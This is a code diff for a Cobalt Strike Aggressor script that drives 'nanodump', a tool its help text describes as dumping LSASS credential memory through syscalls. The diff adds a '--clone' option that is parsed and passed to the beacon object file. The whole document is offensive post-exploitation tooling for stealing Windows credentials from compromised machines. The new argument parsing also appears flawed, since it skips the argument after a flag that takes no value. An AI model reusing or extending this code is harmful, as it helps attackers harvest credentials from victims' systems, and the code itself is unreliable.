@@ -13,9 +13,9 @@ local('@dictionary', '$signature');
 beacon_command_register(
 "nanodump",
 "Use syscalls to dump LSASS.",
-"Usage: nanodump [--pid 1234] [--valid] [--write C:\\Windows\\Temp\\doc.docx]");
+"Usage: nanodump [--pid 1234] [--valid] [--write C:\\Windows\\Temp\\doc.docx] [--clone]");
 alias nanodump {
-    local('$barch $handle $data $args $pid $cname $dump_name $write_file $signature $i');
+    local('$barch $handle $data $args $pid $cname $dump_name $write_file $signature $clone $i');
 
     $barch = barch($1);
     if($barch eq "x86")
@@ -58,6 +58,8 @@ alias nanodump {
     $dump_name = $cname . "_" . $time . "_lsass.dmp";
     # by default, download the minidump fileless
     $write_file = 0;
+    # by default, do not clone target process
+    $clone = 0;
     # by default, the signature of the minidump is invalid
     $signature = get_invalid_sig();
     for ($i = 1; $i < size(@_); $i++)
@@ -74,6 +76,12 @@ alias nanodump {
             $write_file = 1;
             $i++;
             $dump_name = @_[$i];
+        }
+        else if (@_[$i] eq "--clone" || @_[$i] eq "-c")
+        {
+            # set arg to true for process cloning
+            $clone = 1;
+            $i++;
         }
         else if (@_[$i] eq "--valid" || @_[$i] eq "-v")
         {
@@ -93,7 +101,7 @@ alias nanodump {
     }
 
     # pack the arguments
-    $args = bof_pack($1, "iziz", $pid, $dump_name, $write_file, $signature);
+    $args = bof_pack($1, "izizi", $pid, $dump_name, $write_file, $signature, $clone);
 
     # run
     btask($1, "Running NanoDump");
